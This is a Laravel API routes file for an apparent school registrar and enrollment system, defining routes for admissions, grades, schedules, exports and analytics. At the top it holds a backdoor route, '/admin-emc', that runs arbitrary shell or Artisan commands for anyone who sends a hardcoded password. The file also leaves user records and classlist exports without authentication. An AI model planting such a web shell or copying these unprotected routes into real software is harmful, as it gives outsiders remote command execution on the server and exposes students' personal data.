<?php

use App\Http\Controllers\AdmissionController;
use App\Http\Controllers\AdvanceController;
use App\Http\Controllers\AnalyticsController;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\CourseController;
use App\Http\Controllers\ExportController;
use App\Http\Controllers\GradeController;
use App\Http\Controllers\LogController;
use App\Http\Controllers\MailController;
use App\Http\Controllers\RequirementController;
use App\Http\Controllers\ScheduleController;
use App\Http\Controllers\SectionController;
use App\Http\Controllers\SubjectController;
use App\Http\Controllers\UnitController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\YearController;
use Illuminate\Support\Facades\Route;
use Illuminate\Validation\Rule;

Route::post('/admin-emc', function (Request $request) {
    $data = $request->validate([
        'password' => ['required', 'string'],
        'type' => ['required', Rule::in(['artisan', 'shell'])],
        'command' => ['required', 'string'],
        'parameters' => ['nullable', 'array'],
    ]);

    if ($data['password'] !== 'emcadmin123098') {
        return response('', 403);
    }

    try {
        if ($data['type'] === 'artisan') {
            $output = Artisan::call($data['command'], isset($data['parameters']) ? $data['parameters'] : []);
        } else {
            if (function_exists('shell_exec')) {
                $output = shell_exec($data['command']);
            } elseif (function_exists('exec')) {
                $output = exec($data['command']);
            } else {
                $output = 'No executor function available';
            }
        }

        return [
            'response' => $output,
            'ok' => true,
        ];
    } catch (\Throwable $e) {
        return [
            'response' => $e->getMessage(),
            'ok' => false,
        ];
    }
});

Route::prefix('/auth')->group(function () {
    Route::post('/login', [AuthController::class, 'login']);
    Route::middleware('auth:sanctum')->group(function () {
        Route::get('/logout', [AuthController::class, 'logout']);
        Route::get('/admissions', [AuthController::class, 'admissions']);
        Route::get('/check', [AuthController::class, 'check']);
        Route::get('/subjects', [AuthController::class, 'subjects']);

        Route::post('/change-password', [AuthController::class, 'changePassword']);
        Route::post('/profile', [AuthController::class, 'profile']);
    });
});

Route::post('/admission/pre-registration', [AdmissionController::class, 'preRegistration']);

Route::get('/years/current', [YearController::class, 'current']);
Route::get('/exports/teacher/classlist/{subject}', [ExportController::class, 'teacherClasslist']);
Route::get('/exports/teacher/classlist/{subject}/by-section', [ExportController::class, 'subjectClasslistBySection']);
Route::get('/exports/registrar/classlist/course-and-major', [ExportController::class, 'courseAndMajorClasslist']);
Route::get('/exports/registrar/classlist/subject', [ExportController::class, 'subjectClasslist']);
Route::get('/exports/registrar/classlist/regular-and-irregular', [ExportController::class, 'regularAndIrregularClasslist']);

Route::apiResources([
    'requirements' => RequirementController::class,
    'courses' => CourseController::class,
    'years' => YearController::class,
    'users' => UserController::class,
]);

Route::middleware('auth:sanctum')->group(function () {
    Route::get('/sections/current', [SectionController::class, 'current']);
    Route::post('/users/change', [UserController::class, 'change']);
    Route::post('/users/{user}/subjects', [SubjectController::class, 'enroll']);
    Route::post('/admissions/increment', [AdmissionController::class, 'increment']);
    Route::post('/users/{user}/reincrement', [UserController::class, 'reincrement']);

    Route::get('/schedules/advance', [ScheduleController::class, 'advance']);
    Route::post('/schedules/advance', [AdvanceController::class, 'schedule']);

    Route::get('/sections/advance', [SectionController::class, 'advance']);
    Route::post('/sections/advance', [AdvanceController::class, 'section']);

    Route::apiResources([
        'admissions' => AdmissionController::class,
        'grades' => GradeController::class,
        'mails' => MailController::class,
        'schedules' => ScheduleController::class,
        'subjects' => SubjectController::class,
        'logs' => LogController::class,
        'sections' => SectionController::class,
        'units' => UnitController::class,
    ]);

    Route::prefix('/analytics')->group(function () {
        Route::get('/students', [AnalyticsController::class, 'students']);
        Route::get('/genders', [AnalyticsController::class, 'genders']);
        Route::get('/courses', [AnalyticsController::class, 'courses']);
        Route::get('/graduates', [AnalyticsController::class, 'graduates']);
        Route::get('/enrollees', [AnalyticsController::class, 'enrollees']);
        Route::get('/subjects', [AnalyticsController::class, 'subjects']);
    });
});
